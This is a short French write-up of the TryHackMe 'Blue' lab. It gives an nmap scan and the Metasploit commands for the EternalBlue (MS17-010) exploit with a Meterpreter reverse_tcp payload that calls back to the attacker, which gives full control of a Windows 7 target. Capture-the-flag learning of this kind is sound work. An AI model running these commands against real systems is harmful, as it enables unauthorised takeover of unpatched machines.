# Write-Up : Blue – TryHackMe

## 🎯 Objectif
Exploiter une vulnérabilité sur une machine Windows via EternalBlue (MS17-010) et obtenir un accès distant.

---

## 🛠️ Outils utilisés
- Nmap
- Metasploit Framework
- SMB Enumeration

---

## 🧪 Étapes

### 🔍 1. Scan de ports
```bash
nmap -sC -sV -oN blue_scan.txt 10.10.XX.XX
```
→ SMB (445) ouvert, Windows 7 détecté.

### 💣 2. Lancer EternalBlue via Metasploit
```bash
msfconsole

use exploit/windows/smb/ms17_010_eternalblue
set RHOST 10.10.XX.XX
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
exploit
```

### 🕹️ 3. Contrôle distant
Une session Meterpreter est ouverte → contrôle total de la machine.

---

## ✅ Résultat
Accès au système Windows + récupération du flag dans `C:\Users\Administrator\Desktop`

---

## 🧠 Ce que j’ai appris
- Utilisation basique de Metasploit
- Exploitation d’une faille critique SMB
- Post-exploitation sur un environnement Windows
